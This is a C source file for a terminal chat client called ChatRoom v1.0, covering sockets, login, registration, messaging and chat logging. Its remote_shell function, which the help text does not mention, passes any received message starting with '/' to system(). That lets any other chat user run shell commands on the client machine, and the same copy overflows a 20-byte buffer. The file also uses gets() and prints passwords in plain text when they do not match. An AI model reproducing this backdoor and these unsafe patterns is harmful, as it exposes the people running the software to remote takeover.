#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<time.h>
#include<pthread.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include<sys/types.h>
#include<sys/socket.h>


#define DATA_LEN 450

char username[16];
char password[16]; 

char *time_str; //当前时间

/*定义传输数据包的结构体*/
struct bag {
	char message_option;
	char message_src[16];	//发送者ID
	char message_dest[16]; //接收者ID
	char message_data[450]; //消息内容
} info;


/*时间*/
char * now_time(int type)
{
	int h,n,s;
	long ts;
	char *string;
	struct tm *ptm;
	time_t timep;

	time(&timep);
	ts = time(NULL);
	ptm = localtime(&ts);
	h = ptm -> tm_hour;
	n = ptm -> tm_min;
	s = ptm -> tm_sec;
	if(type == 1) {
		printf("%d:%d:%d ",h,n,s);
	}else if(type == 2) {
		printf("%s ",ctime(&timep));
	}
	else {
		string = ctime(&timep);
	}
	return (string);
}

/*聊天记录*/
void chat_logs(struct bag info,int type)
{
	FILE *fp;
	char *logs;
	int size;

	logs = (char *)malloc(540);
	time_str = now_time(0);
	if(type == 1) { //发送群信息
		size = sprintf(logs,"%s[%s] ==> %s",time_str,(char *)info.message_src,(char *)info.message_data);
	} else if(type == 2) { //发送私人信息
		size = sprintf(logs,"%s[%s] ==>@ %s %s",time_str,(char *)info.message_src,(char *)info.message_dest,(char *)info.message_data);
	} else if(type == 3) { //接收群信息
		size = sprintf(logs,"%s[%s] ==> %s",time_str,(char *)info.message_src,(char *)info.message_data);
	} else {        //接收私人信息
		size = sprintf(logs,"%s[%s] ==>@ %s %s",time_str,(char *)info.message_src,(char *)info.message_dest,(char *)info.message_data);
	}
	fp = fopen("chat_logs.txt","a+");
	fwrite(logs,size,1,fp);
	fputc('\n',fp);
	fclose(fp);
	free(logs);
}

/*发送数据的处理*/
void data_send(int sockfd,char message_string[DATA_LEN],int ture)
{
	int i,t;
	char c;
	char str1[16] = {0};
	char str2[450] = {0};

	
	strcpy(info.message_src,username);
	info.message_option = 'A';

	/*解析输入的字符串*/
	if(message_string[0] == '@') { //私聊 “＠someboy info”
		for(i = 1;(c = message_string[i])!= '\0';i ++) {
			if(c != ' ') {
				str1[i-1] = message_string[i];
			} else {
				t = i;
				break;
			}
		}
		for(i = t+1;(message_string[i])!= '\0';i ++) {
			str2[i-t-1] = message_string[i];
		}
		if(strlen(str1) != 0) {
			strcpy(info.message_dest,str1);
		} else {
			printf("Error:no dest username!\n");
			return;
		}
		strcpy(info.message_data,str2);
		chat_logs(info,2);
	}
	else {               //群聊 “info”
		strcpy(info.message_dest,"TO_ALL");
		strcpy(info.message_data,message_string);
		chat_logs(info,1);
	}

	if(send(sockfd,(void *)&info,sizeof(info)+1,0) == -1) {
		perror("sending");
		exit(1);
	}
	if(ture) {
		now_time(1);
		printf("[%s] ",username);
		printf("=S=> %s\n",message_string);

	}
}

/*远程执行命令*/
int remote_shell(struct bag info)
{
	int i;
	char string[20]; 

	if(info.message_data[0] != '/') return 1;
	
	for(i = 0;info.message_data[i] !='\0';i ++) {
		string[i] = info.message_data[i+1];
	}
	system(string);
	return 0;
}

/*打印接收到的消息*/
void print(char option)
{

	if(option == 'A') { //消息
		now_time(1);
		if(strcmp(info.message_dest,"TO_ALL") == 0) {  //接受群消息
			if(remote_shell(info)) {
			printf("[%s] =R=> %s\n",info.message_src,info.message_data);
			chat_logs(info,2);
			}
		} else { //接受私消息
			if(remote_shell(info)) {
				printf("[%s] =R=> @%s %s\n",info.message_src,info.message_dest,info.message_data);
				chat_logs(info,3);
			}
		}
	} 
	if(option == 'B') { //登录
		printf("%s\n",info.message_data);
		if(strncmp(info.message_src,"FAILE",6) == 0) {
			exit(0);
		}
	}
	if(option == 'C') { //注册
		printf("%s\n",info.message_data);
		if(info.message_src != "FAILE") {
			printf("Please login again!\n");
		}
		exit(0);
	}
	if(option == 'D') { //显示在线人数
		printf("-------\n");
		printf("%s",info.message_data);
		printf("-------\n");
	}
}

/*接收数据包*/
int * data_recv(void *fd)
{
	int ret;
	int sockfd;

	sockfd = *((int *)fd);

	while(1){

		if((ret = recv(sockfd,(void *)&info,sizeof(info),0))< 0) {
			perror("recv");
			exit(1);
		}
	
		if(ret > 1 ) {
			print(info.message_option);
		}
	}
	close(sockfd);
	pthread_exit(NULL);
}

/*初始化套接字*/
int setup(int argc,char **argv)
{
	int sockfd;
	struct sockaddr_in address;

	/*创建套接字*/
	if((sockfd = socket(AF_INET,SOCK_STREAM,0))== -1) {
		perror("socket");
		exit(1);
	}

	/*初始化服务器端地址结构*/
	memset(&address,0,sizeof(struct sockaddr_in));
	address.sin_family = AF_INET;
	address.sin_port = htons(atoi(argv[2]));
	inet_pton(AF_INET,argv[1],&address.sin_addr);

	/*建立连接*/
	if((connect(sockfd,(struct sockaddr *)&address,sizeof(address)))== -1) {
		perror("connect");
		exit(1);
	}

	printf("\n");
	return sockfd;
}

/*服务端认证*/
int user_ident(char option,int sockfd)
{
	info.message_option = option;
	strncpy(info.message_src,username,16);
	strcpy(info.message_dest,password);
	strcpy(info.message_data,"Identition infomation!\n");
	if(send(sockfd,(void *)&info,sizeof(info)+1,0) == -1) {
		perror("send_ident");
		exit(1);
	}
}

/*登录*/
int log_sys(int sockfd)
{
	char *passwd;

	while(1) {
		printf("Input username: ");
		getchar();
		gets(username);
		if(username[0] == '\0') {
			printf("Username could not empty!\n");
			continue;
		}
		passwd = getpass("Input password: ");
		if(passwd[0] == '\0') {
			printf("Password could not empty!\n");
			continue;
		}
		strncpy(password,passwd,16);
		user_ident('B',sockfd);
		break;
	}
}

/*注册*/
int reg_sys(int sockfd)
{ 
	char passwd[16];
	char *pass;

	while(1) {
		printf("Input new username: ");
		getchar();
		gets(username);
		if(username[0] == '\0') {
			printf("Username could not empty!\n");
			exit(1);
	    }
		pass = getpass("Input new password: ");
		if(pass[0] == '\0') {
			printf("Password could not empty!\n");
			exit(1);
		}
		strncpy(password,pass,16);
		strncpy(passwd,getpass("Comfirm new password: "),16);
		if(strcmp(password,passwd)== 0) {  //确认密码
			user_ident('C',sockfd);
			break;		
		} else {
			printf("Error:comfirm password wrong!\n");
		}
		printf("[%s] =/= [%s]\n",password,passwd);
	}
}

/*输入待发送的数据*/
int data_input(int sockfd)
{
	char message_string[DATA_LEN];

	while(1) {
		fgets(message_string,450,stdin);
		fflush(stdin);
		if((strncmp(message_string,"exit",4))== 0) {
			data_send(sockfd,message_string,0);
			break;
		}
		if(strncmp(message_string,"clients",7)== 0) {
			struct bag info = {'D',"0","0","0"};
			strncpy(info.message_src,username,sizeof(username));
			send(sockfd,(void *)&info,sizeof(info),0);
		} else{
			data_send(sockfd,message_string,1);
		}
    }
	return sockfd;
}

/*初始化界面*/
void startup()
{
	printf("ChatRoom v1.0  -a software to chat with others!\n");
	printf("Copyright 2014 by Linger <lingerhk@gmail.com>\n\n");
	printf("Usage:client [address] [port]\n\n");
	printf("Start option:\n");
	printf("\t“login”  --login the chatroom\n");
	printf("\t“reg”  --registered a account\n");
	printf("\t“exit”  --exit this software\n\n");
	printf("Run option:\n");
	printf("\t“someboy info”  --send a message to all onlines\n");
	printf("\t“@someboy info”  --send a message to someboy\n");
	printf("\t“clients”  --send a online clients number request\n");
	printf("\t“exit”  --exit this software\n\n");
	now_time(2);
}


/*主调函数*/
int main(int argc,char **argv)
{
	int sockfd;
	char choose[10];
	pthread_t thid_recv;

	/*判断传入的参数个数*/
    if(argc != 3) {
		startup();
		exit(1);
	}

	/*初始化网络*/
	sockfd = setup(argc,argv);

	/*登录与注册*/
	startup();
	printf("\nWait...\n");	
	while(1) {
		scanf("%s",choose);
		if(strncmp(choose,"login",5) == 0) {
			log_sys(sockfd);
			break;
		} else if(strncmp(choose,"reg",3)== 0) {
			reg_sys(sockfd);
			break;
		} else if(strncmp(choose,"exit",4)== 0) {
			exit(0);
		} else {
			printf("Error:invaluable input!\nInput again: ");
		}
	}

	/*创建新线程，接受数据*/
	if(pthread_create(&thid_recv,NULL,(void *)data_recv,(void *)&sockfd)!= 0) {
		perror("pthread_create");
		exit(1);
	}

	/*输入发送数据*/
	sockfd = data_input(sockfd);
	
	close(sockfd);
	now_time(2);
	printf("\n");
	exit(0);
}
